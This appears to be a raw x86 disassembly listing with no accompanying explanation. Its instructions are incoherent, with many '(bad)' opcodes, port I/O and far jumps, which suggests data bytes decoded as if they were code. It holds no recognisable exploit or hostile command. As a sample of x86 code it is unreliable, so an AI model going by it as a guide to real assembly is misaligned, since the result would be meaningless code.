  41ab6d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ab6e:	jg     0x41ab86
  41ab70:	jae    0x41ab83
  41ab72:	adc    BYTE PTR [edi],ch
  41ab74:	cmp    BYTE PTR [edi+0x73a2cc91],ch
  41ab7a:	dec    ecx
  41ab7b:	sbb    edi,DWORD PTR [ebx+0x52]
  41ab7e:	sub    eax,0x7ab6dc92
  41ab83:	mov    ebx,edi
  41ab85:	ja     0x41abb7
  41ab87:	imul   ebp,DWORD PTR [eax-0x77b851c5],0x2965746b
  41ab91:	and    al,0xad
  41ab93:	fcmovnbe st,st(2)
  41ab95:	ret    
  41ab96:	xchg   esp,eax
  41ab97:	jnp    0x41abe7
  41ab99:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ab9a:	pop    ebx
  41ab9b:	in     al,dx
  41ab9c:	push   ds
  41ab9d:	js     0x41ab88
  41ab9f:	sub    DWORD PTR ds:0x7f8d57f,0x72
  41aba6:	ds repz dec eax
  41aba9:	daa    
  41abaa:	cwde   
  41abab:	xchg   esp,eax
  41abac:	and    eax,0x66d00e4f
  41abb1:	pop    esp
  41abb2:	enter  0xe3ae,0x8f
  41abb6:	pop    edx
  41abb7:	scas   al,BYTE PTR es:[edi]
  41abb8:	sub    eax,0x3cbe1e96
  41abbd:	mov    dl,0x32
  41abbf:	cmp    DWORD PTR [ecx+0x6b1db5c8],esp
  41abc5:	repnz fwait
  41abc7:	aam    0xc2
  41abc9:	test   al,0x30
  41abcb:	cli    
  41abcc:	pop    ss
  41abcd:	dec    ebp
  41abce:	xchg   edi,esp
  41abd0:	mov    ebx,eax
  41abd2:	(bad)  
  41abd3:	daa    
  41abd4:	sub    BYTE PTR [ecx+0x75e638f7],al
  41abda:	call   0x7ff7:0x9681a251
  41abe1:	push   ebx
  41abe2:	mov    ds:0x637156b0,al
  41abe7:	xor    BYTE PTR [ebx-0x72859aa4],dl
  41abed:	js     0x41abe2
  41abef:	sub    eax,0x40b9db8a
  41abf4:	ret    
  41abf5:	jnp    0x41ab78
  41abf7:	leave  
  41abf8:	or     DWORD PTR [edx+0x56],0x89671e
  41abff:	inc    ebp
  41ac00:	test   al,0x3
  41ac02:	jo     0x41ac5d
  41ac04:	outs   dx,DWORD PTR ds:[esi]
  41ac05:	fmul   st(7),st
  41ac07:	cmp    eax,0x404926a1
  41ac0c:	gs adc al,0x41
  41ac0f:	les    eax,FWORD PTR [eax]
	...
  41ac71:	add    BYTE PTR [eax],al
  41ac73:	add    BYTE PTR [edx+0x49],ch
  41ac76:	es cmp al,0x27
  41ac79:	jg     0x41acf5
  41ac7b:	pop    edi
  41ac7c:	or     al,0x44
  41ac7e:	xor    ah,BYTE PTR [esi+ecx*1-0x5c]
  41ac82:	icebp  
  41ac83:	stc    
  41ac84:	add    BYTE PTR [ecx+eax*1],bl
  41ac87:	add    BYTE PTR [ecx+eax*1],al
  41ac8a:	add    BYTE PTR [eax],al
  41ac8c:	push   0x2e
  41ac8e:	xchg   ebp,eax
  41ac8f:	in     al,0x85
  41ac91:	mov    BYTE PTR [ecx+0x4d],dh
  41ac94:	jbe    0x41ac8f
  41ac96:	xchg   esi,eax
  41ac97:	das    
  41ac98:	push   ebx
  41ac99:	aam    0x5e
  41ac9b:	js     0x41acf5
  41ac9d:	int3   
  41ac9e:	sub    bh,BYTE PTR [ebp-0x7d]
  41aca1:	push   cs
  41aca2:	ja     0x41acf2
  41aca4:	in     al,0x60
  41aca6:	mov    bl,0x89
  41aca8:	mov    edx,DWORD PTR [ebp-0x65]
  41acab:	dec    eax
  41acac:	les    ebx,FWORD PTR [edx]
  41acae:	cmp    eax,0x42d327bf
  41acb3:	out    0xf6,eax
  41acb5:	ja     0x41acbf
  41acb7:	jmp    0x78a4a2e0
  41acbc:	pop    ecx
  41acbd:	mov    bh,0xbe
  41acbf:	push   0x24
  41acc1:	sbb    dh,0xfa
  41acc4:	in     eax,0x55
  41acc6:	js     0x41ac8d
  41acc8:	jge    0x41ace1
  41acca:	mov    ecx,DWORD PTR [ecx-0x480ae752]
  41acd0:	mov    esi,0x75c8da57
  41acd5:	in     eax,0xaa
  41acd7:	stc    
  41acd8:	leave  
  41acd9:	adc    ebp,DWORD PTR [ebx-0x3a78c29c]
  41acdf:	fistp  WORD PTR [eax+0x15]
  41ace2:	xchg   esi,eax
  41ace3:	mov    edx,0x8b3c84a8
  41ace8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ace9:	ins    DWORD PTR es:[edi],dx
  41acea:	xor    eax,0xc7c6c174
  41acef:	test   al,0xe4
  41acf1:	mov    dh,0xc
  41acf3:	arpl   WORD PTR [eax],ax
  41acf5:	dec    ecx
  41acf6:	daa    
  41acf7:	pop    es
  41acf8:	iret   
  41acf9:	ret    
  41acfa:	(bad)  
  41acfb:	lock add ecx,DWORD PTR [ebp-0x3]
  41acff:	cdq    
  41ad00:	rol    BYTE PTR [eax],0xdd
  41ad03:	jno    0x41ad0f
  41ad05:	sbb    al,0xe3
  41ad07:	xchg   edi,eax
  41ad08:	or     eax,0xa15d511c
  41ad0d:	or     eax,0xf61f114a
  41ad12:	pop    ss
  41ad13:	enter  0x19a9,0x3e
  41ad17:	fisttp QWORD PTR [esi-0x54]
  41ad1a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ad1b:	dec    eax
  41ad1c:	mov    ds,WORD PTR [esp+edi*2]
  41ad1f:	(bad)  
  41ad20:	in     eax,dx
  41ad21:	rcr    BYTE PTR [edx+0x490bda1a],cl
  41ad27:	xlat   BYTE PTR ds:[ebx]
  41ad28:	retf   
  41ad29:	retf   0x3edd
  41ad2c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ad2d:	xchg   ebp,ecx
  41ad2f:	imul   ebp,DWORD PTR [esi-0x5e],0xffffffcf
  41ad33:	jbe    0x41acea
  41ad35:	je     0x41ad5b
  41ad37:	jns    0x41acc0
  41ad39:	and    al,0x8c
  41ad3b:	xchg   esp,eax
  41ad3c:	ret    0x4f08
  41ad3f:	jge    0x41acf9
  41ad41:	sbb    al,0x7d
  41ad43:	push   eax
  41ad44:	sub    al,0x71
  41ad46:	sar    ah,cl
  41ad48:	int    0x39
  41ad4a:	jns    0x41ad85
  41ad4c:	sbb    DWORD PTR [edx+0x7e],0xf6d06f87
  41ad53:	gs inc esp
  41ad55:	xor    BYTE PTR [esi+eax*8-0x58],bl
  41ad59:	jl     0x41adc2
  41ad5b:	xchg   DWORD PTR [esi+0x14],esi
  41ad5e:	aaa    
  41ad5f:	mov    eax,ds:0x7e0334e0
  41ad64:	out    0x36,al
  41ad66:	adc    DWORD PTR [edi+0x5bbc933a],edx
  41ad6c:	fimul  DWORD PTR [ebx+ebx*2+0x2e]
  41ad70:	cmc    
  41ad71:	dec    eax
  41ad72:	test   DWORD PTR [edx-0x26],edi
  41ad75:	loop   0x41ad4d
  41ad77:	mov    es,WORD PTR [edx]
  41ad79:	in     al,0x2e
  41ad7b:	cmc    
  41ad7c:	mov    dl,0x9f
  41ad7e:	mov    bh,0x60
  41ad80:	ins    DWORD PTR es:[edi],dx
  41ad81:	add    DWORD PTR [eax-0x35546b8e],eax
  41ad87:	stos   BYTE PTR es:[edi],al
  41ad88:	lsl    ebp,WORD PTR [ecx]
  41ad8b:	pop    es
  41ad8c:	aam    0x9a
  41ad8e:	mov    cl,0x15
	...
  41adf4:	push   ebp
  41adf5:	clc    
  41adf6:	or     DWORD PTR [esi-0x4280053],ebx
  41adfc:	dec    edi
  41adfd:	push   eax
  41adfe:	cmp    DWORD PTR [ebx+edi*4+0x4477437],esp
  41ae05:	sbb    eax,0x1040001
  41ae0a:	add    BYTE PTR [eax],al
  41ae0c:	push   ecx
  41ae0d:	xchg   ecx,eax
  41ae0e:	call   0x83244960
  41ae13:	push   es
  41ae14:	xlat   BYTE PTR ds:[ebx]
  41ae15:	push   0x5c
  41ae17:	adc    BYTE PTR [edi+0x44],ah
  41ae1a:	pop    ebx
  41ae1b:	and    esp,0x18e0c089
  41ae21:	sbb    BYTE PTR [ecx+0x4e],dh
  41ae24:	and    eax,DWORD PTR [ebp+0x70a7c]
  41ae2a:	pop    edi
  41ae2b:	adc    bl,BYTE PTR [ebx-0x3b24298a]
  41ae31:	dec    edx
  41ae32:	cwde   
  41ae33:	in     al,dx
  41ae34:	jg     0x41ae60
  41ae36:	xor    al,0x95
  41ae38:	test   BYTE PTR [ebp-0x5c12e328],ah
  41ae3e:	sbb    al,BYTE PTR ds:0xd43c38ef
  41ae44:	and    al,0xa
  41ae46:	test   edx,ebx
  41ae48:	jb     0x41adf5
  41ae4a:	adc    DWORD PTR [esi+0xcd91206],esi
  41ae50:	aas    
  41ae51:	pop    esp
  41ae52:	push   eax
  41ae53:	mov    ebx,0x82a3c63f
  41ae58:	adc    BYTE PTR [esi+0x38],cl
  41ae5b:	sub    DWORD PTR [ebx+0xa],esi
  41ae5e:	je     0x41adf4
  41ae60:	lods   al,BYTE PTR ds:[esi]
  41ae61:	ret    0xcafd
  41ae64:	in     eax,dx
  41ae65:	jne    0x41ae2e
  41ae67:	inc    esp
  41ae68:	dec    edx
  41ae69:	pop    es
  41ae6a:	dec    eax
  41ae6b:	cmp    BYTE PTR [edx-0x38],dh
  41ae6e:	sbb    BYTE PTR [ebx],dl
  41ae70:	adc    bl,BYTE PTR [edx+edx*8]
  41ae73:	mov    ds:0xddcebb67,eax
  41ae78:	and    DWORD PTR fs:[edx+ebp*1+0x52d05410],ebx
  41ae80:	adc    DWORD PTR [esi-0x63],ebx
  41ae83:	ins    DWORD PTR es:[edi],dx
  41ae84:	les    eax,FWORD PTR [ebp-0x32]
  41ae87:	das    
  41ae88:	push   edi
  41ae89:	sub    DWORD PTR [ebx+eiz*4],edx
  41ae8c:	sahf   
  41ae8d:	sbb    DWORD PTR [ecx-0x4a],esp
  41ae90:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ae91:	mul    DWORD PTR [edi-0x6b89799c]
  41ae97:	inc    ecx
  41ae98:	push   es
  41ae99:	jb     0x41ae3e
  41ae9b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ae9c:	adc    ch,BYTE PTR [eax-0x3f]
  41ae9f:	pop    ds
  41aea0:	retf   
  41aea1:	mov    al,ds:0xc13d2279
  41aea6:	sbb    dl,ah
  41aea8:	and    al,0xa0
  41aeaa:	sub    DWORD PTR ds:0xd6b1cd46,ebp
  41aeb0:	stos   DWORD PTR es:[edi],eax
  41aeb1:	call   0x235b:0xb7f1127c
  41aeb8:	fistp  WORD PTR [edi+0x50]
  41aebb:	mov    BYTE PTR [edx],bh
  41aebd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41aebe:	xchg   esp,eax
  41aebf:	mov    dl,0xc6
  41aec1:	add    BYTE PTR [edx+0x39],ah
  41aec4:	push   esi
  41aec5:	xor    bh,dl
  41aec7:	xchg   DWORD PTR cs:[esi-0x30],ebp
  41aecb:	fild   DWORD PTR [eax-0x3b4741bf]
  41aed1:	and    DWORD PTR [eax+ebp*4-0x46],edx
  41aed5:	mov    BYTE PTR [esp+ecx*4-0x7d5cabd3],0x6c
  41aedd:	push   eax
  41aede:	imul   edi,DWORD PTR [edx],0xd44f44c3
  41aee4:	mov    BYTE PTR [ebx+0x3804ea49],dl
  41aeea:	push   ebp
  41aeeb:	jecxz  0x41ae92
  41aeed:	fsub   QWORD PTR [ebp-0x69]
  41aef0:	out    dx,al
  41aef1:	nop
  41aef2:	test   eax,0x453a28cb
  41aef7:	jno    0x41aedf
  41aef9:	(bad)  
  41aefa:	fucom  st(3)
  41aefc:	(bad)  
  41aefe:	fsub   QWORD PTR [ecx+0x3e]
  41af01:	push   0x2f
  41af03:	ret    
  41af04:	(bad)  
  41af06:	adc    ah,ch
  41af08:	in     al,dx
  41af09:	call   0xc32f:0xd59cb13
	...
  41af74:	(bad)  
  41af77:	xor    edi,DWORD PTR [ebp+0x15ffdf77]
  41af7d:	mov    ecx,0x959344ee
  41af82:	adc    al,0x3a
  41af84:	or     BYTE PTR [esi],bl
  41af86:	add    DWORD PTR [eax],eax
  41af88:	add    al,0x1
  41af8a:	add    BYTE PTR [eax],al
  41af8c:	ret    
  41af8d:	stc    
  41af8e:	gs push ebp
  41af90:	sub    eax,0x64b2c12f
  41af95:	loope  0x41afa2
  41af97:	and    BYTE PTR [ecx+0x2f67830a],bh
  41af9d:	mov    fs,WORD PTR [ebp-0x4c]
  41afa0:	sahf   
  41afa1:	repz mov bh,0x2
  41afa4:	jg     0x41af90
  41afa6:	jne    0x41afe1
  41afa8:	mov    dl,BYTE PTR [eax+ebx*8-0x2]
  41afac:	mov    edx,0x2448ebcd
  41afb1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41afb2:	ja     0x41af8b
  41afb4:	cld    
  41afb5:	mov    ch,0xb6
  41afb7:	addr16 lahf 
  41afb9:	mov    edx,0x93971e23
  41afbe:	lea    esp,[edx+0x7e]
  41afc1:	ret    
  41afc2:	dec    ebp
  41afc3:	je     0x41b00d
  41afc5:	call   0x3bd87f68
  41afca:	test   BYTE PTR [ecx+0x65],ch
  41afcd:	dec    edi
  41afce:	fild   QWORD PTR ss:[esi+0x35]
  41afd2:	loop   0x41b042
  41afd4:	sbb    al,0xef
  41afd6:	adc    esi,DWORD PTR [edi]
  41afd8:	mov    ah,0xef
  41afda:	stos   BYTE PTR es:[edi],al
  41afdb:	fwait
  41afdc:	ds shl esp,1
  41afdf:	dec    ebx
  41afe0:	stos   DWORD PTR es:[edi],eax
  41afe1:	jns    0x41af77
  41afe3:	stc    
  41afe4:	xlat   BYTE PTR ds:[ebx]
  41afe5:	cmp    bh,0x4e
  41afe8:	pop    esp
  41afe9:	arpl   WORD PTR [ebp+0x3f5a6748],si
  41afef:	add    eax,0xa962c36d
  41aff4:	cli    
  41aff5:	enter  0x5425,0x33
  41aff9:	fs push eax
  41affb:	mov    al,0x81
  41affd:	adc    al,0xfe
  41afff:	mov    ebp,0xafa2c74b
  41b004:	gs sti 
  41b006:	xlat   BYTE PTR ds:[ebx]
  41b007:	dec    eax
  41b008:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b009:	mov    al,0x50
  41b00b:	push   edi
  41b00c:	(bad)  
  41b00d:	ror    DWORD PTR [edx+0x34288b8f],cl
  41b013:	push   0xc535236c
  41b018:	fld    QWORD PTR [edi-0x43c226b4]
  41b01e:	adc    ebp,DWORD PTR ds:0xc2bbdc19
  41b024:	pop    es
  41b025:	mov    ecx,0xfe398e66
  41b02a:	bound  edx,QWORD PTR [ebp-0x7b3886c9]
  41b030:	jmp    0xb2d62a9b
  41b035:	lahf   
  41b036:	fsub   st(2),st
  41b038:	and    al,0xf8
  41b03a:	mov    ecx,0x6b56f404
  41b03f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b040:	mov    ecx,0x30fd2468
  41b045:	nop
  41b046:	pop    ecx
  41b047:	(bad)
  41b04a:	push   esi
  41b04b:	aaa    
  41b04c:	or     DWORD PTR [esi+eiz*2-0x7c],0x2
  41b051:	clc    
  41b052:	fisttp DWORD PTR [edi]
  41b054:	adc    ebp,DWORD PTR [ebp+0x13]
  41b057:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b058:	pusha  
  41b059:	lods   al,BYTE PTR ds:[esi]
  41b05a:	mov    edx,0xb80a3e7e
  41b05f:	shr    BYTE PTR [ecx+ebp*1+0x23],1
  41b063:	fcmovne st,st(5)
  41b065:	mov    edi,0xfa1113eb
  41b06a:	les    esi,FWORD PTR [ebp+ebx*2-0x66c91841]
  41b071:	test   DWORD PTR [eax+edi*2],edx
  41b074:	and    DWORD PTR [ebx+0x4],esi
  41b077:	clc    
  41b078:	pop    ebx
  41b079:	push   ebx
  41b07a:	jmp    0xe7dd:0x69a87450
  41b081:	lods   al,BYTE PTR ds:[esi]
  41b082:	int3   
  41b083:	(bad)  
  41b084:	cmp    DWORD PTR [ebx*8-0x2befc0cf],edi
  41b08b:	pop    ecx
  41b08c:	ret    0x5987
  41b08f:	mov    BYTE PTR [eax],al
	...
  41b0f1:	add    BYTE PTR [eax],al
  41b0f3:	add    dh,al
  41b0f5:	ficom  WORD PTR [eax]
  41b0f7:	stos   DWORD PTR es:[edi],eax
  41b0f8:	sbb    bh,ch
  41b0fa:	(bad)  
  41b0fb:	call   DWORD PTR [edx+edx*8+0x75]
  41b0ff:	mov    edi,0x95d23e43
  41b104:	or     al,0x1f
  41b106:	add    DWORD PTR [eax],eax
  41b108:	add    al,0x1
  41b10a:	add    BYTE PTR [eax],al
  41b10c:	sbb    al,0x72
  41b10e:	mov    edx,0xd92500da
  41b113:	out    dx,eax
  41b114:	(bad)  
  41b115:	jle    0x41b0e9
  41b117:	and    BYTE PTR ds:0x6d93413e,0x5c
  41b11e:	ss jno 0x41b0d3
  41b121:	cwde   
  41b122:	jne    0x41b194
  41b124:	dec    eax
  41b125:	jecxz  0x41b0c7
  41b127:	adc    al,0x97
  41b129:	push   ebx
  41b12a:	pop    esp
  41b12b:	mov    dh,BYTE PTR [edi+eiz*2+0x26]
  41b12f:	push   0x8df25bdb
  41b134:	jl     0x41b156
  41b136:	not    DWORD PTR ds:[esi]
  41b139:	repz mov ds:0x6c8ab58c,eax
  41b13f:	(bad)  
  41b140:	fistp  QWORD PTR [ebp*1-0x18edf8df]
  41b147:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b148:	dec    eax
  41b149:	jle    0x41b156
  41b14b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b14c:	mov    eax,ds:0x1a70c214
  41b151:	mov    ds,WORD PTR [edx-0x61]
  41b154:	sbb    eax,0xfce5f15b
  41b159:	out    0xe0,al
  41b15b:	inc    edx
  41b15c:	push   ecx
  41b15d:	loope  0x41b17c
  41b15f:	pop    ss
  41b160:	or     DWORD PTR [edx],ebp
  41b162:	pop    ebp
  41b163:	xor    dl,BYTE PTR [eax]
  41b165:	xlat   BYTE PTR ds:[ebx]
  41b166:	jnp    0x41b0f4
  41b168:	cmc    
  41b169:	xor    BYTE PTR [ecx+0x48],al
  41b16c:	outs   dx,BYTE PTR ds:[esi]
  41b16d:	cwde   
  41b16e:	mov    bh,BYTE PTR [esi+ebp*8+0x50]
  41b172:	push   cs
  41b173:	pop    eax
  41b174:	mov    edi,cs
  41b176:	fsin   
  41b178:	mov    ebp,0x6b01d00
  41b17d:	xchg   edx,eax
  41b17e:	jge    0x41b1e0
  41b180:	mov    bh,0xad
  41b182:	push   edi
  41b183:	push   esp
  41b184:	out    0x43,eax
  41b186:	adc    al,0x10
  41b188:	add    ch,BYTE PTR [edi+0x55]
  41b18b:	adc    al,0xa4
  41b18d:	adc    al,ah
  41b18f:	fwait
  41b190:	jne    0x41b160
  41b192:	cmp    al,0x27
  41b194:	daa    
  41b195:	shr    ch,1
  41b197:	shr    DWORD PTR [ebp+0x23b69dcd],1
  41b19d:	xor    eax,0x572cc805
  41b1a2:	into   
  41b1a3:	add    BYTE PTR [ecx-0x273e5e4c],dl
  41b1a9:	addr16 (bad) 
  41b1ab:	cmp    eax,0x5ea8428f
  41b1b0:	xor    DWORD PTR [esi-0x25a2004],edx
  41b1b6:	xor    eax,DWORD PTR [ecx-0x8]
  41b1b9:	sbb    edx,DWORD PTR [esp+ecx*4]
  41b1bc:	mov    ebp,0xe7069ba4
  41b1c1:	sub    ah,BYTE PTR [eax+0x3f94fe99]
  41b1c7:	fs mov al,0x73
  41b1cb:	push   edi
  41b1cc:	cmp    BYTE PTR [edi],cl
  41b1ce:	xchg   ecx,eax
  41b1cf:	sub    al,0x7c
  41b1d1:	xor    ebp,DWORD PTR [edx+0x6943d89c]
  41b1d7:	stos   DWORD PTR es:[edi],eax
  41b1d8:	jmp    DWORD PTR [ebx]
  41b1da:	jmp    0x90c8d6c9
  41b1df:	sub    BYTE PTR [ebp-0x2f7a4bd1],dh
  41b1e5:	push   ds
  41b1e6:	mov    esp,0xc3d3dd07
  41b1ec:	sahf   
  41b1ed:	int3   
  41b1ee:	adc    eax,0x282f4e56
  41b1f3:	xor    DWORD PTR [ebx],esp
  41b1f5:	call   0xf59236ab
  41b1fa:	sbb    eax,DWORD PTR [ebp+edx*4-0x3371e544]
  41b201:	mov    edi,0x13c6e01c
  41b206:	ret    
  41b207:	sti    
  41b208:	outs   dx,BYTE PTR ds:[esi]
  41b209:	and    al,0x86
  41b20b:	xor    ah,BYTE PTR [ebx-0x6d]
  41b20e:	mov    ah,0xfb
	...
  41b274:	mov    fs,WORD PTR [ebp-0x13941f97]
  41b27a:	(bad)  
  41b27b:	out    dx,eax
  41b27c:	stos   BYTE PTR es:[edi],al
  41b27d:	jge    0x41b21a
  41b27f:	or     BYTE PTR [esi+0x10f271fb],dh
  41b285:	and    BYTE PTR [ecx],al
  41b287:	add    BYTE PTR [ecx+eax*1],al
  41b28a:	add    BYTE PTR [eax],al
  41b28c:	pop    edi
  41b28d:	lock out 0xc4,al
  41b290:	mov    ebx,0xb3cd2a08
  41b295:	push   es
  41b296:	fmul   DWORD PTR [esi-0x12]
  41b299:	rcl    DWORD PTR [ebx+0x13658b47],1
  41b29f:	inc    eax
  41b2a0:	adc    al,0x17
  41b2a2:	loop   0x41b249
  41b2a4:	xchg   ebx,eax
  41b2a5:	test   DWORD PTR [ecx+0x4a],esp
  41b2a8:	push   ecx
  41b2a9:	mov    dh,0x1f
  41b2ab:	mov    esp,0x50650f83
  41b2b0:	jg     0x41b238
  41b2b2:	jg     0x41b307
  41b2b4:	stos   DWORD PTR es:[edi],eax
  41b2b5:	jle    0x41b27e
  41b2b7:	mov    al,ds:0xf00d6177
  41b2bc:	daa    
  41b2bd:	lods   eax,DWORD PTR ds:[esi]
  41b2be:	cmp    DWORD PTR [esi-0x735ef22e],edx
  41b2c4:	xor    bh,BYTE PTR [edi-0x8c065d3]
  41b2ca:	add    bh,BYTE PTR [ecx+0x1308401c]
  41b2d0:	push   edi
  41b2d1:	cmp    bh,BYTE PTR [ebx-0x6]
  41b2d4:	fwait
  41b2d5:	sahf   
  41b2d6:	pop    esp
  41b2d7:	jns    0x41b291
  41b2d9:	seta   BYTE PTR [esi+0x49d0a545]
  41b2e0:	push   esi
  41b2e1:	int3   
  41b2e2:	sub    ch,BYTE PTR [edi]
  41b2e4:	xchg   esi,eax
  41b2e5:	jo     0x41b34e
  41b2e7:	and    al,0x62
  41b2e9:	add    BYTE PTR [ecx+ebp*2],dh
  41b2ec:	lods   al,BYTE PTR ds:[si]
  41b2ee:	call   0xfaf1:0xb2bdc485
  41b2f5:	add    DWORD PTR [edi+ecx*1+0x4e04aa1],esi
  41b2fc:	pop    ecx
  41b2fd:	test   DWORD PTR [ebx-0x1369aeb5],edx
  41b303:	dec    DWORD PTR [edx-0x25]
  41b306:	adc    eax,DWORD PTR [ecx+0x3899dd53]
  41b30c:	das    
  41b30d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b30e:	sbb    ebp,DWORD PTR [eax]
  41b310:	aad    0xf3
  41b312:	xchg   edi,eax
  41b313:	xchg   edi,eax
  41b314:	or     eax,0xee27c96c
  41b319:	lods   al,BYTE PTR fs:[esi]
  41b31b:	xchg   edi,eax
  41b31c:	push   cs
  41b31d:	mov    eax,ds:0x476f034a
  41b322:	adc    dh,BYTE PTR [ebx+esi*4]
  41b325:	loop   0x41b399
  41b327:	add    bh,BYTE PTR [eax+eax*4-0x4f]
  41b32b:	add    dh,BYTE PTR ds:0x630d5d54
  41b331:	mov    es,WORD PTR [ebp+0x31]
  41b334:	xchg   esp,eax
  41b335:	out    0xe5,al
  41b337:	xchg   ebp,eax
  41b338:	dec    ecx
  41b339:	xor    ebx,ebp
  41b33b:	jg     0x41b384
  41b33d:	sbb    al,0x73
  41b33f:	adc    BYTE PTR [ebp-0x44dd28da],bl
  41b345:	inc    ebp
  41b346:	jne    0x41b369
  41b348:	int    0x11
  41b34a:	call   FWORD PTR [ebx+0x19b3dbb3]
  41b350:	or     BYTE PTR [edx+eiz*1-0x60de806a],al
  41b357:	in     eax,dx
  41b358:	aaa    
  41b359:	mov    ebx,0x4eb723c8
  41b35e:	or     cl,BYTE PTR [eax-0x47c3d7bc]
  41b364:	or     eax,0xf91f65c5
  41b369:	mov    dl,0x36
  41b36b:	jnp    0x41b315
  41b36d:	cld    
  41b36e:	jle    0x41b3ef
  41b370:	mov    ebp,0xb0c09b20
  41b375:	arpl   WORD PTR [ebx+eiz*4-0x4e],si
  41b379:	in     eax,0x81
  41b37b:	mov    ebx,0xef7be639
  41b380:	push   esp
  41b381:	aaa    
  41b382:	xchg   esp,eax
  41b383:	lods   al,BYTE PTR ds:[esi]
  41b384:	out    dx,eax
  41b385:	mov    dh,0xd5
  41b387:	sbb    esi,edi
  41b389:	sbb    BYTE PTR [ebx-0x52e5d404],0xb9
	...
  41b3f4:	dec    eax
  41b3f5:	or     eax,0xbb5dab1d
  41b3fa:	(bad)  
  41b3fb:	out    dx,eax
  41b3fc:	xchg   ebp,eax
  41b3fd:	iret   
  41b3fe:	push   ebx
  41b3ff:	aas    
  41b400:	sub    al,0xb1
  41b402:	xchg   esp,eax
  41b403:	and    BYTE PTR [ecx+eiz*1],dl
  41b406:	add    DWORD PTR [eax],eax
  41b408:	add    al,0x1
  41b40a:	add    BYTE PTR [eax],al
  41b40c:	push   es
  41b40d:	xor    BYTE PTR [ebx],cl
  41b40f:	push   ebp
  41b410:	out    dx,eax
  41b411:	xchg   ecx,eax
  41b412:	dec    eax
  41b413:	and    cl,BYTE PTR [edi+0xbf65c69]
  41b419:	(bad)  
  41b41a:	pop    ebx
  41b41b:	aad    0xf3
  41b41d:	test   ch,al
  41b41f:	mov    cl,ah
  41b421:	cwde   
  41b422:	fisubr DWORD PTR [esi-0x46]
  41b425:	arpl   WORD PTR [ecx-0x5d1f2af9],sp
  41b42b:	push   edi
  41b42c:	pusha  
  41b42d:	xchg   ebx,eax
  41b42e:	pop    ecx
  41b42f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b430:	std    
  41b431:	pop    esp
  41b432:	retf   
  41b433:	xor    eax,0x462a0f56
  41b438:	push   cs
  41b439:	xchg   DWORD PTR [edx-0x4c],esp
  41b43c:	ret    0xc95f
  41b43f:	jne    0x41b417
  41b441:	add    DWORD PTR [eax-0x3ad7c483],0x18271b21
  41b44b:	sub    esp,DWORD PTR [esi+0x2d4c97ea]
  41b451:	in     eax,0x51
  41b453:	adc    al,dl
  41b455:	daa    
  41b456:	mov    esp,0xd73f3cf9
  41b45b:	mov    esi,0xc25fac3e
  41b460:	xor    esp,esi
  41b462:	pop    ebx
  41b463:	mov    al,0x1f
  41b465:	call   0x6be1:0x3aae5c88
  41b46c:	push   ebx
  41b46d:	pop    es
  41b46e:	or     BYTE PTR [ebx-0x31c780ac],al
  41b474:	in     eax,0x4a
  41b476:	imul   ecx,ebp,0xdb23bbec
  41b47c:	call   0xf38d:0xc1c318ec
  41b483:	sub    ch,BYTE PTR [eax]
  41b485:	and    eax,0xbc0305d7
  41b48b:	or     BYTE PTR [ebp+0x45],bh
  41b48e:	xor    eax,0x440a222b
  41b493:	or     bh,BYTE PTR [ebx]
  41b495:	fimul  WORD PTR [esi+0x0]
  41b498:	scas   eax,DWORD PTR es:[edi]
  41b499:	retf   0xa7ea
  41b49c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b49d:	aaa    
  41b49e:	dec    ebp
  41b49f:	cmp    BYTE PTR [esi-0x4b],dh
  41b4a2:	mov    ebx,0xf358d94d
  41b4a7:	sbb    BYTE PTR [esi+0x7ba121c9],bh
  41b4ad:	push   ds
  41b4ae:	lds    edi,FWORD PTR [ecx-0x57580f77]
  41b4b4:	and    al,0x9b
  41b4b6:	fwait
  41b4b7:	push   esi
  41b4b8:	mov    bh,0x7c
  41b4ba:	mov    ds:0x5b0a31f5,eax
  41b4bf:	dec    BYTE PTR [ebx]
  41b4c1:	gs push ebx
  41b4c3:	(bad)  
  41b4c4:	repz push ss
  41b4c6:	hlt    
  41b4c7:	mov    ebp,0xf607c8aa
  41b4cc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b4cd:	jo     0x41b4a4
  41b4cf:	fld    TBYTE PTR [eax-0x22]
  41b4d2:	(bad)  
  41b4d4:	mov    ebp,0xbf237984
  41b4d9:	pusha  
  41b4da:	iret   
  41b4db:	das    
  41b4dc:	mov    dh,0xf7
  41b4de:	mov    ch,0x6b
  41b4e0:	aaa    
  41b4e1:	cli    
  41b4e2:	xchg   edx,eax
  41b4e3:	sar    BYTE PTR [edx+edx*2-0x69c2ec38],cl
  41b4ea:	xchg   edx,eax
  41b4eb:	jecxz  0x41b4d9
  41b4ed:	jp     0x41b507
  41b4ef:	xlat   BYTE PTR ds:[ebx]
  41b4f0:	push   eax
  41b4f1:	jmp    0x9a9b8527
  41b4f6:	leave  
  41b4f7:	fistp  WORD PTR [eax+0x6a966d64]
  41b4fd:	(bad)  
  41b4fe:	not    BYTE PTR [edx+0xc82b351]
  41b504:	sbb    al,0xda
  41b506:	dec    ah
  41b508:	in     eax,0x7b
  41b50a:	(bad)  
  41b50b:	arpl   WORD PTR [ecx],dx
  41b50d:	dec    edi
  41b50e:	push   es
  41b50f:	inc    ecx
	...
  41b574:	aam    0xec
  41b576:	add    edi,edi
  41b578:	cmp    edi,edi
  41b57a:	(bad)  
  41b57b:	out    dx,eax
  41b57c:	loope  0x41b544
  41b57e:	jns    0x41b561
  41b580:	inc    ebp
  41b581:	mov    BYTE PTR [ebp+edx*8+0x12218],ah
  41b588:	add    al,0x1
